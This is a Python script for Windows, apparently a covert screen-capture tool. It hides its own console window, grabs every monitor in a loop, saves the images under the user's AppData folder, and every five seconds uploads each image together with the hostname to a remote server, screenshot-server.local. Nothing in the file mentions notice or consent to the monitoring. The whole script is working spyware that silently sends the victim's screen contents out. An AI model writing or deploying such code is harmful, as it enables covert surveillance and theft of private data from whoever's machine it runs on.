import os
import datetime
import time
from PIL import ImageGrab, Image
import win32gui
import socket
import requests
import numpy as np
import win32api
import win32con

# Hiden console
win = win32gui.GetForegroundWindow()
win32gui.ShowWindow(win, 0)

# Get hostname
hostname = os.environ['COMPUTERNAME']

# root_path = "C:/Windows/screenshots/"
root_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'appdata\\screenshot')
hostname_folder_path = os.path.join(root_path, hostname)

# Create folder if not exit
if not os.path.exists(hostname_folder_path):
    os.makedirs(hostname_folder_path)

# Get path
# save_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'appdata\\screenshot')
    
while True:
    now = datetime.datetime.now()
    date = now.strftime("%Y-%m-%d")
    filename = now.strftime("%Hh %Mm %Ss.png")
    save_path = os.path.join(hostname_folder_path, date)

    # Create folder if not exit
    if not os.path.exists(save_path):
        os.makedirs(save_path)
    
    # Create path file
    screenshot_filename = os.path.join(save_path, filename )

    # GET NUM SCREEN
    num_monitors = win32api.GetSystemMetrics(win32con.SM_CMONITORS)

    screenshots = []

    for i in range(num_monitors):
        left, top, right, bottom = win32api.GetMonitorInfo(win32api.EnumDisplayMonitors(None, None)[i][0])['Monitor']
        width = right - left
        height = bottom - top
        
        screenshot = ImageGrab.grab(bbox=(left, top, right, bottom))
        
        screenshots.append(screenshot)

    # Ghép các ảnh lại thành một ảnh toàn màn hình
    all_screens = Image.new('RGB', (sum([s.width for s in screenshots]), max([s.height for s in screenshots])))
    x_offset = 0
    for screen in screenshots:
        all_screens.paste(screen, (x_offset,0))
        x_offset += screen.width

    all_screens.save(screenshot_filename)

    url = 'http://screenshot-server.local:8080/upload'

    # Sent file to server
    # files = {'file': open(screenshot_filename, 'rb')}
    # data = {'hostname': hostname, 'date': date}
    # response = requests.post(url, files=files, data=data)

    # Sent file to server and delete of success
    try:
        with open(screenshot_filename, "rb") as f:
            data = {'hostname': hostname, 'date': date}
            response = requests.post(url, files={"file": f}, data=data)
            response.raise_for_status()
            print("File sent successfully.")
            # os.remove(screenshot_filename)
    except requests.exceptions.RequestException as e:
        print(f"Sending file failed: {e}")
        time.sleep(5)
        continue
    
    # sleep 5s
    time.sleep(5)
